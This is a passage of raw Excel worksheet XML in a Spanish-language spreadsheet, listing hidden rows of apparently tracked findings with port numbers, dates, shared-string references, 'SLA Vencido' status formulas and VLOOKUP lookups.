      <c r="B32" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C32" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D32" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E32" s="4"/>
      <c r="F32" s="4"/>
      <c r="G32" s="6" t="s">
        <v>252</v>
      </c>
      <c r="H32" s="4"/>
      <c r="I32" s="4"/>
      <c r="J32" s="4" t="s">
        <v>245</v>
      </c>
      <c r="K32" s="4" t="s">
        <v>246</v>
      </c>
      <c r="L32" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M32" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N32" s="5"/>
      <c r="O32" s="6"/>
      <c r="P32" s="4" t="s">
        <v>253</v>
      </c>
      <c r="Q32" s="6"/>
      <c r="R32" s="4">
        <v>443</v>
      </c>
      <c r="S32" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T32" s="8">
        <v>43812</v>
      </c>
      <c r="U32" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V32" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W32" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X32" s="11"/>
      <c r="Y32" s="11"/>
      <c r="Z32" s="11"/>
      <c r="AA32" s="8">
        <v>43969</v>
      </c>
      <c r="AB32" s="9" t="s">
        <v>254</v>
      </c>
      <c r="AC32" s="9" t="s">
        <v>249</v>
      </c>
      <c r="AD32" s="36"/>
      <c r="AE32" s="4"/>
      <c r="AF32" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG32" s="27"/>
      <c r="AH32" t="str">
        <f>IFERROR(VLOOKUP(H32,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="33" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A33" s="5">
        <v>32</v>
      </c>
      <c r="B33" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C33" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D33" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E33" s="4"/>
      <c r="F33" s="4"/>
      <c r="G33" s="6" t="s">
        <v>255</v>
      </c>
      <c r="H33" s="4"/>
      <c r="I33" s="4"/>
      <c r="J33" s="4" t="s">
        <v>256</v>
      </c>
      <c r="K33" s="9" t="s">
        <v>257</v>
      </c>
      <c r="L33" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M33" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N33" s="5"/>
      <c r="O33" s="6"/>
      <c r="P33" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q33" s="6"/>
      <c r="R33" s="4">
        <v>123</v>
      </c>
      <c r="S33" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T33" s="8">
        <v>43812</v>
      </c>
      <c r="U33" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V33" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W33" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X33" s="11"/>
      <c r="Y33" s="11"/>
      <c r="Z33" s="11"/>
      <c r="AA33" s="8"/>
      <c r="AB33" s="9" t="s">
        <v>259</v>
      </c>
      <c r="AC33" s="9" t="s">
        <v>260</v>
      </c>
      <c r="AD33" s="36"/>
      <c r="AE33" s="4"/>
      <c r="AF33" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG33" s="27"/>
      <c r="AH33" t="str">
        <f>IFERROR(VLOOKUP(H33,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="34" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A34" s="5">
        <v>33</v>
      </c>
      <c r="B34" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C34" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D34" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E34" s="4"/>
      <c r="F34" s="4"/>
      <c r="G34" s="6" t="s">
        <v>255</v>
      </c>
      <c r="H34" s="4"/>
      <c r="I34" s="4"/>
      <c r="J34" s="4" t="s">
        <v>256</v>
      </c>
      <c r="K34" s="9" t="s">
        <v>257</v>
      </c>
      <c r="L34" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M34" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N34" s="5"/>
      <c r="O34" s="6"/>
      <c r="P34" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q34" s="6"/>
      <c r="R34" s="4">
        <v>123</v>
      </c>
      <c r="S34" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T34" s="8">
        <v>43812</v>
      </c>
      <c r="U34" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V34" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W34" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X34" s="11"/>
      <c r="Y34" s="11"/>
      <c r="Z34" s="11"/>
      <c r="AA34" s="8"/>
      <c r="AB34" s="9" t="s">
        <v>262</v>
      </c>
      <c r="AC34" s="9" t="s">
        <v>260</v>
      </c>
      <c r="AD34" s="36"/>
      <c r="AE34" s="4"/>
      <c r="AF34" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG34" s="27"/>
      <c r="AH34" t="str">
        <f>IFERROR(VLOOKUP(H34,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="35" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A35" s="5">
        <v>34</v>
      </c>
      <c r="B35" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C35" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D35" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E35" s="4"/>
      <c r="F35" s="4"/>
      <c r="G35" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H35" s="4"/>
      <c r="I35" s="4"/>
      <c r="J35" s="4" t="s">
        <v>256</v>
      </c>
      <c r="K35" s="9" t="s">
        <v>257</v>
      </c>
      <c r="L35" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M35" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N35" s="5"/>
      <c r="O35" s="6"/>
      <c r="P35" s="4" t="s">
        <v>264</v>
      </c>
      <c r="Q35" s="6"/>
      <c r="R35" s="4">
        <v>123</v>
      </c>
      <c r="S35" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T35" s="8">
        <v>43812</v>
      </c>
      <c r="U35" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V35" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W35" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X35" s="11"/>
      <c r="Y35" s="11"/>
      <c r="Z35" s="11"/>
      <c r="AA35" s="8">
        <v>44069</v>
      </c>
      <c r="AB35" s="9" t="s">
        <v>265</v>
      </c>
      <c r="AC35" s="9" t="s">
        <v>260</v>
      </c>
      <c r="AD35" s="36"/>
      <c r="AE35" s="4"/>
      <c r="AF35" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG35" s="27"/>
      <c r="AH35" t="str">
        <f>IFERROR(VLOOKUP(H35,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="36" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A36" s="5">
        <v>35</v>
      </c>
      <c r="B36" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C36" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D36" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E36" s="4"/>
      <c r="F36" s="4"/>
      <c r="G36" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H36" s="4"/>
      <c r="I36" s="4"/>
      <c r="J36" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K36" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L36" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M36" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N36" s="5"/>
      <c r="O36" s="6"/>
      <c r="P36" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q36" s="6"/>
      <c r="R36" s="4">
        <v>161</v>
      </c>
      <c r="S36" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T36" s="8">
        <v>43812</v>
      </c>
      <c r="U36" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V36" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W36" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X36" s="11"/>
      <c r="Y36" s="11"/>
      <c r="Z36" s="11"/>
      <c r="AA36" s="8">
        <v>43969</v>
      </c>
      <c r="AB36" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC36" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD36" s="36"/>
      <c r="AE36" s="4"/>
      <c r="AF36" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG36" s="27"/>
      <c r="AH36" t="str">
        <f>IFERROR(VLOOKUP(H36,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="37" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A37" s="5">
        <v>36</v>
      </c>
      <c r="B37" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C37" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D37" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E37" s="4"/>
      <c r="F37" s="4"/>
      <c r="G37" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H37" s="4"/>
      <c r="I37" s="4"/>
      <c r="J37" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K37" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L37" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M37" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N37" s="5"/>
      <c r="O37" s="6"/>
      <c r="P37" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q37" s="6"/>
      <c r="R37" s="4">
        <v>123</v>
      </c>
      <c r="S37" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T37" s="8">
        <v>43812</v>
      </c>
      <c r="U37" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V37" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W37" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X37" s="11"/>
      <c r="Y37" s="11"/>
      <c r="Z37" s="11"/>
      <c r="AA37" s="8">
        <v>44069</v>
      </c>
      <c r="AB37" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC37" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD37" s="36"/>
      <c r="AE37" s="4"/>
      <c r="AF37" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG37" s="27"/>
      <c r="AH37" t="str">
        <f>IFERROR(VLOOKUP(H37,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="38" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A38" s="5">
        <v>37</v>
      </c>
      <c r="B38" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C38" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D38" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E38" s="4"/>
      <c r="F38" s="4"/>
      <c r="G38" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H38" s="4"/>
      <c r="I38" s="4"/>
      <c r="J38" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K38" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L38" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M38" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N38" s="5"/>
      <c r="O38" s="6"/>
      <c r="P38" s="6" t="s">
        <v>271</v>
      </c>
      <c r="Q38" s="6"/>
      <c r="R38" s="4">
        <v>123</v>
      </c>
      <c r="S38" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T38" s="8">
        <v>43812</v>
      </c>
      <c r="U38" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V38" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W38" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X38" s="11"/>
      <c r="Y38" s="11"/>
      <c r="Z38" s="11"/>
      <c r="AA38" s="8">
        <v>43969</v>
      </c>
      <c r="AB38" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC38" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD38" s="36"/>
      <c r="AE38" s="4"/>
      <c r="AF38" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG38" s="27"/>
      <c r="AH38" t="str">
        <f>IFERROR(VLOOKUP(H38,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="39" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A39" s="5">
        <v>38</v>
      </c>
      <c r="B39" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C39" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D39" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E39" s="4"/>
      <c r="F39" s="4"/>
      <c r="G39" s="6" t="s">
        <v>272</v>
      </c>
      <c r="H39" s="4"/>
      <c r="I39" s="4"/>
      <c r="J39" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K39" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L39" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M39" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N39" s="5"/>
      <c r="O39" s="6"/>
      <c r="P39" s="6" t="s">
        <v>273</v>
      </c>
      <c r="Q39" s="6"/>
      <c r="R39" s="4">
        <v>123</v>
      </c>
      <c r="S39" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T39" s="8">
        <v>43812</v>
      </c>
      <c r="U39" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V39" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W39" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X39" s="11"/>
      <c r="Y39" s="11"/>
      <c r="Z39" s="11"/>
      <c r="AA39" s="8">
        <v>43969</v>
      </c>
      <c r="AB39" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC39" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD39" s="36"/>
      <c r="AE39" s="4"/>
      <c r="AF39" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG39" s="27"/>
      <c r="AH39" t="str">
        <f>IFERROR(VLOOKUP(H39,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="40" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A40" s="5">
        <v>39</v>
      </c>
      <c r="B40" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C40" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D40" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E40" s="4"/>
      <c r="F40" s="4"/>
      <c r="G40" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H40" s="4"/>
      <c r="I40" s="4"/>
      <c r="J40" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K40" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L40" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M40" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N40" s="5"/>
      <c r="O40" s="6"/>
      <c r="P40" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q40" s="6"/>
      <c r="R40" s="4">
        <v>23</v>
      </c>
      <c r="S40" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T40" s="8">
        <v>43812</v>
      </c>
      <c r="U40" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V40" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W40" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X40" s="11"/>
      <c r="Y40" s="11"/>
      <c r="Z40" s="11"/>
      <c r="AA40" s="8">
        <v>43969</v>
      </c>
      <c r="AB40" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC40" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD40" s="36"/>
      <c r="AE40" s="4"/>
      <c r="AF40" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG40" s="27"/>
      <c r="AH40" t="str">
        <f>IFERROR(VLOOKUP(H40,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="41" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A41" s="5">
        <v>40</v>
      </c>
      <c r="B41" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C41" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D41" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E41" s="4"/>
      <c r="F41" s="4"/>
      <c r="G41" s="6" t="s">
        <v>272</v>
      </c>
      <c r="H41" s="4"/>
      <c r="I41" s="4"/>
      <c r="J41" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K41" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L41" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M41" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N41" s="5"/>
      <c r="O41" s="6"/>
      <c r="P41" s="6" t="s">
        <v>273</v>
      </c>
      <c r="Q41" s="6"/>
      <c r="R41" s="4">
        <v>161</v>
      </c>
      <c r="S41" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T41" s="8">
        <v>43812</v>
      </c>
      <c r="U41" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V41" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W41" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X41" s="11"/>
      <c r="Y41" s="11"/>
      <c r="Z41" s="11"/>
      <c r="AA41" s="8">
        <v>43969</v>
      </c>
      <c r="AB41" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC41" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD41" s="36"/>
      <c r="AE41" s="4"/>
      <c r="AF41" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG41" s="27"/>
      <c r="AH41" t="str">
        <f>IFERROR(VLOOKUP(H41,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="42" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A42" s="5">
        <v>41</v>
      </c>
      <c r="B42" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C42" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D42" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E42" s="4"/>
      <c r="F42" s="4"/>
      <c r="G42" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H42" s="4"/>
      <c r="I42" s="4"/>
      <c r="J42" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K42" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L42" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M42" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N42" s="5"/>
      <c r="O42" s="6"/>
      <c r="P42" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q42" s="6"/>
      <c r="R42" s="4">
        <v>22</v>
      </c>
      <c r="S42" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T42" s="8">
        <v>43812</v>
      </c>
      <c r="U42" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V42" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W42" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X42" s="11"/>
      <c r="Y42" s="11"/>
      <c r="Z42" s="11"/>
      <c r="AA42" s="8">
        <v>43969</v>
      </c>
      <c r="AB42" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC42" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD42" s="36"/>
      <c r="AE42" s="4"/>
      <c r="AF42" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG42" s="27"/>
      <c r="AH42" t="str">
        <f>IFERROR(VLOOKUP(H42,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="43" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A43" s="5">
        <v>42</v>
      </c>
      <c r="B43" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C43" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D43" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E43" s="4"/>
      <c r="F43" s="4"/>
      <c r="G43" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H43" s="4"/>
      <c r="I43" s="4"/>
      <c r="J43" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K43" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L43" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M43" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N43" s="5"/>
      <c r="O43" s="6"/>
      <c r="P43" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q43" s="6"/>
      <c r="R43" s="4">
        <v>123</v>
      </c>
      <c r="S43" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T43" s="8">
        <v>43812</v>
      </c>
      <c r="U43" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V43" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W43" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X43" s="11"/>
      <c r="Y43" s="11"/>
      <c r="Z43" s="11"/>
      <c r="AA43" s="8">
        <v>43969</v>
      </c>
      <c r="AB43" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC43" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD43" s="36"/>
      <c r="AE43" s="4"/>
      <c r="AF43" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG43" s="27"/>
      <c r="AH43" t="str">
        <f>IFERROR(VLOOKUP(H43,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="44" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A44" s="5">
        <v>43</v>
      </c>
      <c r="B44" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C44" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D44" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E44" s="4"/>
      <c r="F44" s="4"/>
      <c r="G44" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H44" s="4"/>
      <c r="I44" s="4"/>
      <c r="J44" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K44" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L44" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M44" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N44" s="5"/>
      <c r="O44" s="6"/>
      <c r="P44" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q44" s="6"/>
      <c r="R44" s="4">
        <v>161</v>
      </c>
      <c r="S44" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T44" s="8">
        <v>43812</v>
      </c>
      <c r="U44" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V44" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W44" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X44" s="11"/>
      <c r="Y44" s="11"/>
      <c r="Z44" s="11"/>
      <c r="AA44" s="8">
        <v>44069</v>
      </c>
      <c r="AB44" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC44" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD44" s="36"/>
      <c r="AE44" s="4"/>
      <c r="AF44" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG44" s="27"/>
      <c r="AH44" t="str">
        <f>IFERROR(VLOOKUP(H44,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="45" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A45" s="5">
        <v>44</v>
      </c>
      <c r="B45" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C45" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D45" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E45" s="4"/>
      <c r="F45" s="4"/>
      <c r="G45" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H45" s="4"/>
      <c r="I45" s="4"/>
      <c r="J45" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K45" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L45" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M45" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N45" s="5"/>
      <c r="O45" s="6"/>
      <c r="P45" s="6" t="s">
        <v>247</v>
      </c>
      <c r="Q45" s="6"/>
      <c r="R45" s="4">
        <v>22</v>
      </c>
      <c r="S45" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T45" s="8">
        <v>43812</v>
      </c>
      <c r="U45" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V45" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W45" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X45" s="11"/>
      <c r="Y45" s="11"/>
      <c r="Z45" s="11"/>
      <c r="AA45" s="8">
        <v>43969</v>
      </c>
      <c r="AB45" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC45" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD45" s="36"/>
      <c r="AE45" s="4"/>
      <c r="AF45" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG45" s="27"/>
      <c r="AH45" t="str">
        <f>IFERROR(VLOOKUP(H45,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="46" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A46" s="5">
        <v>45</v>
      </c>
      <c r="B46" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C46" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D46" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E46" s="4"/>
      <c r="F46" s="4"/>
      <c r="G46" s="6" t="s">
        <v>255</v>
      </c>
      <c r="H46" s="4"/>
      <c r="I46" s="4"/>
      <c r="J46" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K46" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L46" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M46" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N46" s="5"/>
      <c r="O46" s="6"/>
      <c r="P46" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q46" s="6"/>
      <c r="R46" s="4">
        <v>123</v>
      </c>
      <c r="S46" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T46" s="8">
        <v>43812</v>
      </c>
      <c r="U46" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V46" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W46" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X46" s="11"/>
      <c r="Y46" s="11"/>
      <c r="Z46" s="11"/>
      <c r="AA46" s="8"/>
      <c r="AB46" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC46" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD46" s="36"/>
      <c r="AE46" s="4"/>
      <c r="AF46" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG46" s="27"/>
      <c r="AH46" t="str">
        <f>IFERROR(VLOOKUP(H46,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="47" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A47" s="5">
        <v>46</v>
      </c>
      <c r="B47" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C47" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D47" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E47" s="4"/>
      <c r="F47" s="4"/>
      <c r="G47" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H47" s="4"/>
      <c r="I47" s="4"/>
      <c r="J47" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K47" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L47" s="5" t="s">
        <v>141</v>
